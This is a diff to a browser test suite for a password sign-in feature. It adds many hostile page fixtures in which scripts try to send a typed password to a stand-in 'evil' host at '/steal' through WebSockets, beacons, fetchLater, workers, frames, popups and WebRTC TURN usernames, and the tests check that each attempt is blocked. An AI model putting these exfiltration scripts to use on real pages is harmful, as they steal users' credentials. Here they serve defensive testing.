@@ -1,4 +1,5 @@
 import { createHash } from "node:crypto";
+import { createSocket } from "node:dgram";
 import { once } from "node:events";
 import type { IncomingMessage, ServerResponse } from "node:http";
 import { createServer } from "node:http";
@@ -74,16 +75,36 @@ describe(signIn, () => {
     let evil: Awaited<ReturnType<typeof site>>;
     let login: Awaited<ReturnType<typeof site>>;
     /** What the login site serves at `/` and answers at `/session`; each case sets them. */
-    const fixture: { home: string; onSession: Handler; page: string; worker: string } = { home: "", onSession: () => undefined, page: "", worker: "" };
+    const fixture: { evil: string; home: string; onSession: Handler; page: string; popup: string; worker: string } = {
+        evil: "",
+        home: "",
+        onSession: () => undefined,
+        page: "",
+        popup: "",
+        worker: "",
+    };
+    /** Every UDP datagram the other site's address receives: where WebRTC talks to a TURN server. */
+    const datagrams: string[] = [];
+    const udp = createSocket("udp4", (message) => {
+        datagrams.push(message.toString("latin1"));
+    });
+    let turn = "";
 
     beforeAll(async () => {
-        browser = await chromium.launch();
-        evil = await site("127.0.0.2", (_request, response) => response.end("ok"));
+        // Cross-site frames in their own process, as with site isolation: each is a target of its own.
+        browser = await chromium.launch({ args: ["--site-per-process"] });
+        evil = await site("127.0.0.2", (request, response) => (request.url === "/relay" ? html(response, fixture.evil) : response.end("ok")));
+        await new Promise<void>((resolve) => {
+            udp.bind(0, "127.0.0.2", resolve);
+        });
+        turn = `turn:127.0.0.2:${udp.address().port}`;
         login = await site("127.0.0.1", (request, response, body) => {
             if (request.url === "/session") {
                 fixture.onSession(request, response, body);
             } else if (request.url?.startsWith("/home")) {
                 html(response, fixture.home);
+            } else if (request.url === "/popup") {
+                html(response, fixture.popup);
             } else if (request.url === "/worker.js") {
                 response.setHeader("content-type", "text/javascript");
                 response.end(fixture.worker);
@@ -97,6 +118,7 @@ describe(signIn, () => {
         await browser.close();
         evil.close();
         login.close();
+        udp.close();
     });
 
     beforeEach(async () => {
@@ -104,6 +126,7 @@ describe(signIn, () => {
         page = await context.newPage();
         evil.hits.length = 0;
         login.hits.length = 0;
+        datagrams.length = 0;
         fixture.home = "<h1>Home</h1>";
         fixture.onSession = (_request, response) => {
             response.writeHead(303, { location: "/home" });
@@ -143,6 +166,18 @@ describe(signIn, () => {
 
         expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
         expect(sessionPosts()).toStrictEqual([{ body: `user=ann&pw=${SAVED_SECRET}`, method: "POST", url: "/session" }]);
+        // The lock is lifted with the cleanup: the page the session goes on with has WebRTC and runs workers.
+        const workerRan = await page.evaluate(
+            async () =>
+                new Promise((resolve) => {
+                    const worker = new Worker(URL.createObjectURL(new Blob(["postMessage(true)"])));
+
+                    worker.addEventListener("message", (event) => resolve(event.data));
+                }),
+        );
+
+        expect(workerRan).toBe(true);
+        expect(await page.evaluate(() => typeof RTCPeerConnection)).toBe("function");
     });
 
     it.each([
@@ -430,15 +465,29 @@ describe(signIn, () => {
         expect(result).toMatchObject({ error: expect.stringContaining("not sent"), submitted: false, success: false });
     });
 
-    it("refuses a WebSocket to another site while the password is in the page", async () => {
+    it.each([
+        ["to another site", () => `${evil.origin.replace("http", "ws")}/steal?`],
+        ["with it in the path to the login's own site", () => `${login.origin.replace("http", "ws")}/socket/`],
+    ])("refuses a WebSocket %s while the password is in the page", async (_where, address) => {
         fixture.page = loginForm(
-            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); new WebSocket("${evil.origin.replace("http", "ws")}/steal?" + document.forms[0].pw.value); });`,
+            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); new WebSocket("${address()}" + document.forms[0].pw.value); });`,
         );
 
         const result = await run();
 
         expect(result).toMatchObject({ error: expect.stringContaining("WebSocket"), submitted: false, success: false });
-        expect(evil.hits).toStrictEqual([]);
+        expect([...evil.hits, ...login.hits].filter((hit) => hit.method === "WEBSOCKET")).toStrictEqual([]);
+    });
+
+    it("counts a login a script sends on a WebSocket to the login's site as sent", async () => {
+        fixture.page = loginForm(
+            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); const socket = new WebSocket("${login.origin.replace("http", "ws")}/socket"); socket.onopen = () => socket.send(JSON.stringify({ pw: document.forms[0].pw.value, user: document.forms[0].user.value })); });`,
+        );
+
+        const result = await run();
+
+        expect(result).toMatchObject({ submitted: true });
+        expect(login.hits.filter((hit) => hit.method === "FRAME 1")).toHaveLength(1);
     });
 
     it("closes a WebSocket to another site the page opened before the password was typed", async () => {
@@ -453,6 +502,16 @@ describe(signIn, () => {
         expect(result).toMatchObject({ submitted: true, success: true });
         expect(evil.hits.map((hit) => hit.method).filter((method) => method !== "FRAME 8")).toStrictEqual(["WEBSOCKET"]);
     });
+
+    /** A worker's script that sends what it is handed to the other site on a WebSocket and by POST. */
+    const exfiltrate = (): string =>
+        `const send = (data) => { new WebSocket("${evil.origin.replace("http", "ws")}/steal?" + data); fetch("${evil.origin}/steal", { body: data, method: "POST", mode: "no-cors" }); };`;
+    const onSubmit = (body: string, before = ""): string =>
+        loginForm(
+            `${before} document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); const pw = document.forms[0].pw.value; ${body} });`,
+        );
+    const blobWorker = (realm: string): string =>
+        `new ${realm}.Worker(${realm}.URL.createObjectURL(new ${realm}.Blob([${JSON.stringify(`${exfiltrate()} onmessage = (event) => send(event.data);`)}]))).postMessage(pw);`;
 
     it("sees the form's POST past a service worker that would answer it itself", async () => {
         fixture.page = loginForm();
@@ -469,11 +528,12 @@ describe(signIn, () => {
         expect(sessionPosts()).toHaveLength(1);
     });
 
-    it("blocks a service worker that the page hands the password to", async () => {
-        fixture.page = loginForm(
-            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); navigator.serviceWorker.controller.postMessage(document.forms[0].pw.value); });`,
-        );
-        fixture.worker = `self.addEventListener("activate", (event) => event.waitUntil(clients.claim())); self.addEventListener("message", (event) => { fetch("${evil.origin}/steal", { body: event.data, method: "POST", mode: "no-cors" }); });`;
+    it.each([
+        ["a message", "navigator.serviceWorker.ready.then((registration) => registration.active.postMessage(pw));"],
+        ["a broadcast", `new BroadcastChannel("out").postMessage(pw);`],
+    ])("gives a service worker no way to the password by %s", async (_how, send) => {
+        fixture.page = onSubmit(send);
+        fixture.worker = `${exfiltrate()} self.addEventListener("activate", (event) => event.waitUntil(clients.claim())); self.addEventListener("message", (event) => send(event.data)); new BroadcastChannel("out").onmessage = (event) => send(event.data);`;
         await page.goto(`${login.origin}/`);
         await page.evaluate(async () => {
             await navigator.serviceWorker.register("/worker.js");
@@ -482,8 +542,131 @@ describe(signIn, () => {
 
         const result = await run();
 
-        expect(result).toMatchObject({ error: expect.stringContaining("tried to send"), submitted: false, success: false });
+        expect(result).toMatchObject({ submitted: false, success: false });
         expect(evil.hits).toStrictEqual([]);
+    });
+
+    it.each([
+        [
+            "a worker started with the page",
+            () => {
+                return {
+                    page: onSubmit("worker.postMessage(pw);", `const worker = new Worker("/worker.js");`),
+                    worker: `${exfiltrate()} onmessage = (event) => send(event.data);`,
+                };
+            },
+        ],
+        [
+            "a shared worker",
+            () => {
+                return {
+                    page: onSubmit(`new SharedWorker("/worker.js").port.postMessage(pw);`),
+                    worker: `${exfiltrate()} onconnect = (event) => { event.ports[0].onmessage = (message) => send(message.data); };`,
+                };
+            },
+        ],
+        [
+            "a blob worker",
+            () => {
+                return { page: onSubmit(blobWorker("window")) };
+            },
+        ],
+        [
+            "a worker of a blank frame's realm",
+            () => {
+                return { page: onSubmit(`const frame = document.createElement("iframe"); document.body.append(frame); ${blobWorker("frame.contentWindow")}`) };
+            },
+        ],
+        [
+            "a WebSocketStream",
+            () => {
+                return { page: onSubmit(`new WebSocketStream("${evil.origin.replace("http", "ws")}/steal?" + pw);`) };
+            },
+        ],
+        [
+            "fetchLater",
+            () => {
+                return { page: onSubmit(`fetchLater("${evil.origin}/steal", { activateAfter: 0, body: pw, method: "POST" });`) };
+            },
+        ],
+        [
+            "a keepalive fetch as the page unloads",
+            () => {
+                return {
+                    page: loginForm(
+                        `addEventListener("pagehide", () => fetch("${evil.origin}/steal?" + document.forms[0].pw.value, { keepalive: true, mode: "no-cors" }));`,
+                    ),
+                };
+            },
+        ],
+        [
+            "a keepalive fetch whose options change as they are read",
+            () => {
+                return {
+                    page: loginForm(
+                        `let reads = 0; addEventListener("pagehide", () => fetch("${evil.origin}/steal?" + document.forms[0].pw.value, { get keepalive() { reads += 1; return reads > 1; }, mode: "no-cors" }));`,
+                    ),
+                };
+            },
+        ],
+        [
+            "a beacon as the page unloads",
+            () => {
+                return { page: loginForm(`addEventListener("pagehide", () => navigator.sendBeacon("${evil.origin}/steal", document.forms[0].pw.value));`) };
+            },
+        ],
+        [
+            "a link prefetch",
+            () => {
+                return {
+                    page: onSubmit(
+                        `const link = document.createElement("link"); link.rel = "prefetch"; link.href = "${evil.origin}/steal?" + pw; document.head.append(link);`,
+                    ),
+                };
+            },
+        ],
+    ])("gives %s no way out with the password", async (_what, make) => {
+        Object.assign(fixture, make());
+
+        await run();
+
+        expect(evil.hits).toStrictEqual([]);
+    });
+
+    it("gives a worker of a cross-site frame the page hands the password to no way out", async () => {
+        // The frame says it runs, and whether its Worker is the browser's own.
+        fixture.evil = `<script>parent.postMessage(String(Function.prototype.toString.call(Worker).includes("native")), "*"); onmessage = (event) => { const pw = event.data; ${blobWorker("window")} };</script>`;
+        fixture.page = `<iframe src="${evil.origin}/relay"></iframe>${onSubmit(`frames[0].postMessage(pw, "*");`, `addEventListener("message", (event) => fetch("/alive?native=" + event.data), { once: true });`)}`;
+
+        await run();
+
+        // The first load, under the lock; the cleanup's reload, after it, runs the frame again.
+        expect(login.hits.find((hit) => hit.url.startsWith("/alive"))).toStrictEqual({ body: "", method: "GET", url: "/alive?native=false" });
+        expect(evil.hits.filter((hit) => hit.url !== "/relay")).toStrictEqual([]);
+    });
+
+    const rtc = (from: string): string =>
+        `const connection = new ${from}.RTCPeerConnection({ iceServers: [{ credential: "x", urls: "${turn}", username: pw }] }); connection.createDataChannel("out"); connection.createOffer().then((offer) => connection.setLocalDescription(offer));`;
+
+    it.each([
+        ["the page", () => rtc("window")],
+        ["a blank frame's realm", () => `const frame = document.createElement("iframe"); document.body.append(frame); ${rtc("frame.contentWindow")}`],
+    ])("refuses WebRTC from %s while the password is in it", async (_where, send) => {
+        fixture.page = onSubmit(send());
+
+        await run();
+
+        expect(datagrams).toStrictEqual([]);
+    });
+
+    it("closes a window the page opened before the password was typed, before it runs", async () => {
+        fixture.popup = `<script>setInterval(() => { const pw = opener.document.forms[0]?.pw.value; if (pw) { ${rtc("window")} } }, 50);</script>`;
+        fixture.page = `${loginForm()}<a href="/popup" target="side">side</a><script>document.querySelector("a").click();</script>`;
+
+        await run();
+
+        expect(datagrams).toStrictEqual([]);
+        expect(context.pages()).toStrictEqual([page]);
     });
 
     it("counts the form's own POST as sent when the page re-encodes the password first", async () => {
